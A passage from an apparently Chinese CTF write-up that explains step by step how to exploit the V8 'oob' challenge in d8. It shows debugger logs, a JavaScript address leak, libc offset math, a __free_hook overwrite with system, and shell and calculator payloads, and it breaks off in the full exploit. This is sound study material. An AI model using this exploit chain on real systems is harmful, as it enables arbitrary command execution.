title="8、传统堆利用方式exp构造"></a>8、传统堆利用方式exp构造</h2><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>步骤如下：</p><p>1、泄露程序本身的地址空间</p><p>2、计算d8基址，读取GOT表中malloc等libc函数的内存地址，然后然后计算free_hook或system或one_gadget的地址，最后将system或one_gadget写入free_hook触发hook调用即可实现命令执行</p><p>3、调用free（实际上调用了/bin/sh），getshell</p><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>可以通过以下顺序：</p><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p><p>debug日志如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x27b381f0f8c9</span></span><br><span class="line"><span class="number">0x27b381f0f8c9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x1ff245482ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1ff245482ed9</span></span><br><span class="line"><span class="number">0x1ff245482ed9</span>: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - back pointer: <span class="number">0x1ff245482e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2009df480609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #<span class="number">1</span>: <span class="number">0x25166f051f49</span> &lt;DescriptorArray[<span class="number">1</span>]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #<span class="number">1</span>: <span class="number">0x25166f051eb9</span> &lt;TransitionArray[<span class="number">4</span>]&gt;Transition array #<span class="number">1</span>:</span><br><span class="line">     <span class="number">0x0de30b5c4ba1</span> &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x1ff245482f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - constructor: <span class="number">0x25166f050ec1</span> &lt;JSFunction <span class="built_in">Array</span> (sfi = <span class="number">0x2009df486791</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0de30b5c02c1</span> &lt;Other heap <span class="built_in">object</span> (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x25166f050ec1</span></span><br><span class="line"><span class="number">0x25166f050ec1</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x1ff245482d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f042109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x2009df483b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x1ff245482d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x2009df486791</span> &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: <span class="number">0x0de30b5c3599</span> &lt;String[#<span class="number">5</span>]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x25166f041869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x1e6620dc6981</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x25166f051029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4804b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x2009df480449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#prototype: 0x2009df480529 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="number">0x0de30b5c4c79</span> &lt;Symbol: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x0de30b5c4f41</span> &lt;Symbol: Symbol.species&gt;: <span class="number">0x25166f050fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: <span class="number">0x25166f051069</span> &lt;JSFunction <span class="built_in">isArray</span> (sfi = <span class="number">0x2009df486829</span>)&gt; (<span class="keyword">const</span> data field <span class="number">1</span>) properties[<span class="number">1</span>]</span><br><span class="line">    <span class="meta">#from: 0x25166f0510a1 <span class="meta-string">&lt;JSFunction from (sfi = 0x2009df486879)&gt;</span> (const data field 2) properties[2]</span></span><br><span class="line">    <span class="meta">#of: 0x25166f0510d9 <span class="meta-string">&lt;JSFunction of (sfi = 0x2009df4868b1)&gt;</span> (const data field 3) properties[3]</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e6620dc6981</span></span><br><span class="line"><span class="number">0x1e6620dc6981</span>: [Code]</span><br><span class="line"> - map: <span class="number">0x0de30b5c0a31</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = ArrayConstructor</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x7ffc86ea2078</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Trampoline</span> (size = <span class="number">13</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c0</span>     <span class="number">0</span>  <span class="number">49b</span>a8087519805560000 REX.W movq r10,<span class="number">0x560598518780</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x1e6620dc69ca</span>     a  <span class="number">41f</span>fe2         jmp r10</span><br><span class="line"></span><br><span class="line"><span class="built_in">Instructions</span> (size = <span class="number">28</span>)</span><br><span class="line"><span class="number">0x560598518780</span>     <span class="number">0</span>  <span class="number">493955</span>d8       REX.W cmpq [r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value)),rdx</span><br><span class="line"><span class="number">0x560598518784</span>     <span class="number">4</span>  <span class="number">7405</span>           jz <span class="number">0x56059851878b</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x560598518786</span>     <span class="number">6</span>  <span class="number">488b</span>ca         REX.W movq rcx,rdx</span><br><span class="line"><span class="number">0x560598518789</span>     <span class="number">9</span>  eb03           jmp <span class="number">0x56059851878e</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56059851878b</span>     b  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x56059851878e</span>     e  <span class="number">498b</span>5dd8       REX.W movq rbx,[r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value))</span><br><span class="line"><span class="number">0x560598518792</span>    <span class="number">12</span>  <span class="number">488b</span>d1         REX.W movq rdx,rcx</span><br><span class="line"><span class="number">0x560598518795</span>    <span class="number">15</span>  e926000000     jmp <span class="number">0x5605985187c0</span>  (ArrayConstructorImpl)</span><br><span class="line"><span class="number">0x56059851879a</span>    <span class="number">1</span>a  <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x56059851879b</span>    <span class="number">1b</span>  <span class="number">90</span>             nop</span><br><span class="line"></span><br><span class="line"><span class="built_in">Safepoints</span> (size = <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">RelocInfo</span> (size = <span class="number">2</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c2</span>  off heap target</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1e6620dc6980</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1e6620dc6980</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1e6620dc6988</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1e6620dc6990</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1e6620dc6998</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1e6620dc69a0</span> —▸ <span class="number">0x2009df4916a9</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1e6620dc69a8</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1e6620dc69b0</span> ◂— sbb    al, <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1e6620dc69b8</span> ◂— <span class="keyword">and</span>    al, <span class="number">0</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│   <span class="number">0x1e6620dc69c0</span> ◂— movabs r10, <span class="number">0x560598518780</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│   <span class="number">0x1e6620dc69c8</span> ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│   <span class="number">0x1e6620dc69d0</span> ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│   <span class="number">0x1e6620dc69e0</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│   <span class="number">0x1e6620dc69e8</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│   <span class="number">0x1e6620dc69f0</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│   <span class="number">0x1e6620dc69f8</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│   <span class="number">0x1e6620dc6a00</span> —▸ <span class="number">0x2009df4916c1</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│   <span class="number">0x1e6620dc6a08</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│   <span class="number">0x1e6620dc6a10</span> ◂— mov    byte ptr [rcx], al</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│   <span class="number">0x1e6620dc6a18</span> ◂— lahf</span><br><span class="line"></span><br><span class="line"><span class="comment">//在偏移0x40的位置取到程序地址空间地址</span></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x560598518780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x560597bc9000</span>     <span class="number">0x5605987a1000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写泄露地址空间地址代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>gdb执行如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc1.js</span><br><span class="line">...</span><br><span class="line"><span class="number">0x2583cc70fa41</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] leak from: <span class="number">0x000013eba5410ef0</span>: <span class="number">0x000015e8b1dc6981</span></span><br><span class="line">[*] leak from: <span class="number">0x000015e8b1dc69c2</span>: <span class="number">0x00005626808ca780</span></span><br><span class="line">[*] find libc leak_d8_addr: <span class="number">0x00005626808ca780</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00005626808ca780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x56267ff7b000</span>     <span class="number">0x562680b53000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br></pre></td></tr></table></figure><h3 id="计算程序基址以及got表各函数地址"><a href="#计算程序基址以及got表各函数地址" class="headerlink" title="计算程序基址以及got表各函数地址"></a>计算程序基址以及got表各函数地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr)); </span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(libc_free_hook_addr, libc_system_addr); </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>下面逐个进行讲解</p><h4 id="获取d8-base-addr"><a href="#获取d8-base-addr" class="headerlink" title="获取d8_base_addr"></a>获取d8_base_addr</h4><p>通过下面两张图，可以看到我们泄露的地址为0x0000559f4ba96780，而应用程序的基地址为0x559f4aace000，这样他们的差值就为0xfc8780</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201643280.png" alt="image-20210104201643280"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201717162.png" alt="image-20210104201717162"></p><h4 id="获取d8-got-libc-start-main-addr"><a href="#获取d8-got-libc-start-main-addr" class="headerlink" title="获取d8_got_libc_start_main_addr"></a>获取d8_got_libc_start_main_addr</h4><p>ida查看.got的偏移，这里是0x12a47b0</p><h4 id="获取libc-start-main-addr"><a href="#获取libc-start-main-addr" class="headerlink" title="获取libc_start_main_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104201218775.png" alt="image-20210104201218775">获取libc_start_main_addr</h4><p><img src="/2021/04/21/starctf2019-oob/image-20210104201103483.png" alt="image-20210104201103483"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201129304.png" alt="image-20210104201129304"></p><h4 id="获取libc-base-addr"><a href="#获取libc-base-addr" class="headerlink" title="获取libc_base_addr"></a>获取libc_base_addr</h4><p>libc的基址可以通过泄露的libc_start_main与偏移进行计算，我们在此次执行中可以知道0x00007f6e88df3fc0是libc_start_main在libc中的地址，0x7f6e88dcd000是libc基址，所以这里的偏移为0x26fc0</p><h4 id="获取libc-system-addr和libc-free-hook-addr"><a href="#获取libc-system-addr和libc-free-hook-addr" class="headerlink" title="获取libc_system_addr和libc_free_hook_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104202359104.png" alt="image-20210104202359104">获取libc_system_addr和libc_free_hook_addr</h4><p>ida查看下libc文件，可以看出__libc_start_main确实是在libc基址偏移0x26fc0</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104202851003.png" alt="image-20210104202851003"></p><p>所以我们可以直接通过查看ida来确定system和free_hook的偏移，可以看出来分别为0x55410，0x1eeb28</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104203218607.png" alt="image-20210104203218607"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210105091543768.png" alt="image-20210105091543768"></p><p>也可以通过gdb中泄露函数或者全局变量的地址，再通过与libc基址相减，即可得到相对应的偏移</p><p><img src="/2021/04/21/starctf2019-oob/image-20210105092417427.png" alt="image-20210105092417427"></p><p>最后申请一个变量在进行释放，触发free操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="/2021/04/21/starctf2019-oob/image-20210105092756824.png" alt="image-20210105092756824"></p><p>也可以发送弹出计算器的命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00 </span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><p><img src="/2021/04/21/starctf2019-oob/image-20210105093339083.png" alt="image-20210105093339083"></p><h3 id="完整exp如下-1"><a href="#完整exp如下-1" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span 